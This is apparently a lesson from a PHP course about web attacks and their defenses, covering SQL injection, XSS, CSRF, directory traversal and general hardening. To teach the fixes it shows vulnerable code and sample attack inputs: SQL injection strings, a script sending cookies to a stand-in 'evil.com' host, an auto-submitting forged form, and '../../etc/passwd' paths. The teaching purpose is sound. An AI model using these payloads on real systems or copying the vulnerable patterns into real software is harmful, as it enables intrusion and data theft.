

You have a working application with auth, forms, and a database. Today you learn how attackers try to break it and exactly how PHP stops them. These aren't abstract concepts — each one has caused real breaches in production systems you've heard of.

## The four attacks you must understand cold

```
1. SQL Injection    — attacker controls your database queries
2. XSS             — attacker runs JavaScript in your users' browsers  
3. CSRF            — attacker makes your users perform actions they didn't intend
4. Directory traversal — attacker reads files outside your web root
```

You've already been using the defenses instinctively — prepared statements, `htmlspecialchars()`, POST-only destructive actions. Today you understand _why_ each defense works, see the actual attack, and close any gaps.

---

## 1. SQL Injection

### The attack

```php
<?php
declare(strict_types=1);

// VULNERABLE — never do this
$id = $_GET["id"];   // attacker sends: ' OR '1'='1
$row = $pdo->query("SELECT * FROM users WHERE id = '$id'")->fetch();

// The query becomes:
// SELECT * FROM users WHERE id = '' OR '1'='1'
// Returns every row in the table

// Worse — attacker sends: '; DROP TABLE users; --
// SELECT * FROM users WHERE id = ''; DROP TABLE users; --
// Deletes your entire users table

// Worse still — UNION injection to extract data:
// ' UNION SELECT username, password_hash, 3, 4 FROM users --
// Returns usernames and password hashes disguised as normal results
```

### The defense — prepared statements

```php
<?php
declare(strict_types=1);

// SAFE — parameterised query, always
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->execute([":id" => $_GET["id"]]);
$row = $stmt->fetch();

// Why it works: the parameter is sent to MySQL separately from the SQL
// MySQL never interprets it as SQL syntax — it's pure data
// ' OR '1'='1 is stored literally, matches nothing, returns nothing
```

### Second-order injection — the subtle one

```php
<?php
declare(strict_types=1);

// First-order: attacker injects directly into a query
// Second-order: attacker stores malicious data, which is later used unsafely

// Step 1 — attacker registers with username: admin'--
// Your registration uses a prepared statement — data stored safely

// Step 2 — some other part of the codebase does this (badly):
$username = $user["username"];   // retrieved safely from DB
// Dev thinks "this came from DB, it's safe" — WRONG
$pdo->query("UPDATE logs SET actor = '$username' WHERE ...");
// Now the injection fires from trusted data

// Defense: prepared statements EVERYWHERE, not just at input boundaries
// Data from your own database is not automatically safe for raw SQL
```

Prepared statements everywhere, without exception. "This value came from the database" is not a reason to skip parameterisation.

---

## 2. Cross-Site Scripting (XSS)

### The attack

```php
<?php
declare(strict_types=1);

// Attacker submits this as their username:
$username = "<script>
    fetch('https://evil.com/steal?c=' + document.cookie);
</script>";

// If you output it raw:
echo "Welcome, $username";
// The script runs in every visitor's browser
// Steals their session cookies — attacker can log in as them

// Stored XSS — attacker saves malicious input to the database
// Every user who views the page is attacked

// Reflected XSS — malicious input comes from a URL parameter
// Attacker sends a crafted link: /search?q=<script>...</script>
// Victim clicks link, script runs in their browser
```

### The defense — context-aware output escaping

```php
<?php
declare(strict_types=1);

function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, "UTF-8");
}

// In HTML context — always use e()
echo "<p>Welcome, " . e($username) . "</p>";
// Outputs: <p>Welcome, &lt;script&gt;...&lt;/script&gt;</p>
// Browser renders it as visible text — script never executes

// In HTML attribute context — also use e()
echo '<input value="' . e($userInput) . '">';

// In JavaScript context — json_encode is the correct escape
$data = ["username" => $username, "id" => 42];
echo "<script>const user = " . json_encode($data) . ";</script>";
// json_encode escapes all special characters for JS context

// In URL context — urlencode or http_build_query
$url = "/search?" . http_build_query(["q" => $userInput]);
echo '<a href="' . e($url) . '">Search</a>';
// e() on the full URL for the HTML attribute context
// http_build_query handles the URL encoding inside

// NEVER use strip_tags() as your XSS defense
// strip_tags("<sc<script>ript>alert(1)</sc</script>ript>") = "alert(1)"
// Nested/broken tags bypass it
```

### Content Security Policy — defence in depth

Add a CSP header to tell browsers which scripts are allowed to run. Even if XSS sneaks through, the browser refuses to execute injected scripts:

```php
<?php
declare(strict_types=1);

// In your bootstrap or layout — before any output
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Referrer-Policy: strict-origin-when-cross-origin");
```

These four headers are the minimum security header set for any web application. Add them to your bootstrap and forget about them — they cost nothing and stop entire classes of attack.

---

## 3. CSRF — Cross-Site Request Forgery

### The attack

```
1. User logs into your fleet manager at fleet.example.com
2. User visits attacker's site (evil.com) in another tab
3. evil.com contains:
   <form method="POST" action="https://fleet.example.com/machines/delete">
     <input type="hidden" name="id" value="vend-001">
   </form>
   <script>document.forms[0].submit();</script>
4. Browser submits the form — including the fleet.example.com session cookie
5. Your server sees a valid session, deletes vend-001
6. User never intended this — they were just browsing evil.com
```

The attack works because browsers automatically send cookies with cross-origin requests. Your server can't tell the difference between a legitimate form submission and an attacker-crafted one — unless you add a CSRF token.

### The defense — synchronizer token pattern

```php
<?php
declare(strict_types=1);

function csrfToken(): string {
    if (empty($_SESSION["csrf_token"])) {
        $_SESSION["csrf_token"] = bin2hex(random_bytes(32));
    }
    return $_SESSION["csrf_token"];
}

function csrfField(): string {
    return '<input type="hidden" name="csrf_token" value="' . e(csrfToken()) . '">';
}

function verifyCsrf(): void {
    $submitted = $_POST["csrf_token"] ?? "";
    $expected  = $_SESSION["csrf_token"] ?? "";

    // hash_equals is timing-safe string comparison
    if (!hash_equals($expected, $submitted)) {
        http_response_code(403);
        die("Invalid CSRF token — request rejected.");
    }
}
```

Every POST form gets the hidden field. Every POST handler verifies it:

```php
<!-- In every form template -->
<form method="POST" action="/machines/delete">
    <?= csrfField() ?>
    <input type="hidden" name="id" value="<?= e($machine["id"]) ?>">
    <button type="submit">Delete</button>
</form>
```

```php
<?php
// In every POST handler — first thing
verifyCsrf();

// Now process the form...
```

Why this works: the attacker's page on `evil.com` can submit a form to your server, but it cannot read your server's response (same-origin policy). It cannot read the CSRF token stored in your user's session. The hidden field contains a value the attacker can't know — their forged request fails verification.

### Rotating tokens vs per-request tokens

The pattern above uses one token per session. For higher security, rotate per form:

```php
<?php
declare(strict_types=1);

function csrfToken(string $formName = "default"): string {
    if (empty($_SESSION["csrf_tokens"][$formName])) {
        $_SESSION["csrf_tokens"][$formName] = bin2hex(random_bytes(32));
    }
    return $_SESSION["csrf_tokens"][$formName];
}

function verifyCsrf(string $formName = "default"): void {
    $submitted = $_POST["csrf_token"] ?? "";
    $expected  = $_SESSION["csrf_tokens"][$formName] ?? "";

    if (!hash_equals($expected, $submitted)) {
        http_response_code(403);
        die("CSRF validation failed.");
    }

    // Rotate after use — token is single-use
    unset($_SESSION["csrf_tokens"][$formName]);
}
```

Per-session tokens are sufficient for most applications. Per-form tokens prevent replay attacks where a recorded request is submitted again. Use per-session for now and upgrade if needed.

---

## 4. Directory Traversal

### The attack

```php
<?php
declare(strict_types=1);

// VULNERABLE — file path from user input
$filename = $_GET["file"];   // attacker sends: ../../etc/passwd
$content  = file_get_contents("/var/www/uploads/" . $filename);
echo $content;
// Reads /var/www/uploads/../../etc/passwd = /etc/passwd
// Exposes system password file

// Worse — with file inclusion:
$page = $_GET["page"];   // attacker sends: ../../../../etc/passwd%00
require "pages/" . $page . ".php";
// On older PHP: null byte truncates .php extension
// Includes arbitrary files from anywhere on the server
```

### The defense — validate and resolve paths

```php
<?php
declare(strict_types=1);

function safeFilePath(string $userInput, string $allowedDirectory): string {
    // Resolve the real absolute path — resolves ../ sequences
    $realBase = realpath($allowedDirectory);

    if ($realBase === false) {
        throw new \RuntimeException("Base directory does not exist: $allowedDirectory");
    }

    // Build the candidate path and resolve it
    $candidate = realpath($realBase . DIRECTORY_SEPARATOR . $userInput);

    if ($candidate === false) {
        throw new \InvalidArgumentException("File does not exist: $userInput");
    }

    // Confirm the resolved path starts with the allowed base
    if (!str_starts_with($candidate, $realBase . DIRECTORY_SEPARATOR)) {
        throw new \InvalidArgumentException("Path traversal detected: $userInput");
    }

    return $candidate;
}

// Usage
try {
    $path    = safeFilePath($_GET["file"], "/var/www/uploads");
    $content = file_get_contents($path);
} catch (\InvalidArgumentException $e) {
    http_response_code(400);
    echo "Invalid file path.";
    exit;
}

// Whitelist approach — even safer, no path logic at all
$allowedFiles = ["manual.pdf", "datasheet.pdf", "readme.txt"];
$requested    = $_GET["file"] ?? "";

if (!in_array($requested, $allowedFiles, true)) {
    http_response_code(400);
    echo "File not available.";
    exit;
}

$content = file_get_contents("/var/www/docs/" . $requested);
```

When possible, use a whitelist. When the set of valid files isn't known in advance, use `realpath()` and prefix-check. Never trust user input as a file path component.

---

## 5. Additional hardening — the checklist

### Error messages that leak information

```php
<?php
declare(strict_types=1);

// LEAKS — tells attacker your database schema, file paths, PHP version
// PDOException: SQLSTATE[42S02]: Base table or view not found: 1146
// Table 'fleet_db.machiness' doesn't exist

// SAFE — log the detail, show nothing
try {
    $machines = Database::fetchAll("SELECT * FROM machiness");
} catch (\PDOException $e) {
    error_log("DB error: " . $e->getMessage());
    http_response_code(500);
    echo "Something went wrong. Please try again.";
    exit;
}
```

### Mass assignment — don't trust field names from forms

```php
<?php
declare(strict_types=1);

// DANGEROUS — updates any column the attacker names
$data = $_POST;   // attacker adds: is_admin=1, password_hash=knowhash
Database::execute(
    "UPDATE users SET " . implode(", ", array_map(
        fn($k) => "$k = :$k", array_keys($data)
    )) . " WHERE id = :id",
    [...$data, ":id" => $userId]
);

// SAFE — whitelist exactly which fields are updatable
$allowed  = ["username", "email"];
$update   = array_intersect_key($_POST, array_flip($allowed));

// Now only username and email can be updated, regardless of what POST contains
```

### Sensitive data in URLs

```php
<?php
declare(strict_types=1);

// WRONG — session token, reset token, or any secret in URL
// https://fleet.example.com/reset?token=abc123
// This token appears in:
// - Browser history
// - Server access logs
// - Referrer headers when the user clicks another link
// - Proxy logs

// RIGHT — tokens in POST bodies or headers
// For password reset: POST /reset with token in form body, not URL
// Exception: OAuth2 uses URL for the code parameter, but it's short-lived and single-use
```

### File upload security preview

You'll cover this fully on Day 16, but the core rules now:

```php
<?php
declare(strict_types=1);

// NEVER trust the filename or MIME type from $_FILES
// Both are supplied by the client and can be anything

// Check MIME type server-side using finfo
$finfo    = new \finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($_FILES["upload"]["tmp_name"]);

$allowed = ["image/jpeg", "image/png", "image/gif"];
if (!in_array($mimeType, $allowed, true)) {
    die("Invalid file type.");
}

// Generate your own filename — never use the user-supplied name
$ext      = match($mimeType) {
    "image/jpeg" => "jpg",
    "image/png"  => "png",
    "image/gif"  => "gif",
};
$filename = bin2hex(random_bytes(16)) . "." . $ext;
```

---

## Putting it all together — a security middleware

Add this to your `bootstrap.php` so every request gets the baseline protections:

```php
<?php
declare(strict_types=1);

// Security headers — applied to every response
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Referrer-Policy: strict-origin-when-cross-origin");
header("Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'");

// Disable PHP version disclosure
header_remove("X-Powered-By");

// Ensure errors are never shown to users in production
$env = getenv("APP_ENV") ?: "development";
if ($env === "production") {
    ini_set("display_errors", "0");
    ini_set("log_errors", "1");
}
```

---


After Day 15 your application has the four pillars: SQL injection stopped by prepared statements, XSS stopped by output escaping, CSRF stopped by synchronizer tokens, and path traversal stopped by `realpath()` validation. That's a genuinely secure foundation — most real-world PHP breaches exploit exactly these four vulnerabilities.

Days 16 and 17 complete Phase 2. Day 16 is file uploads, Day 17 is your mini blog project where everything from Phase 2 comes together. Paste your code or call the next day when ready.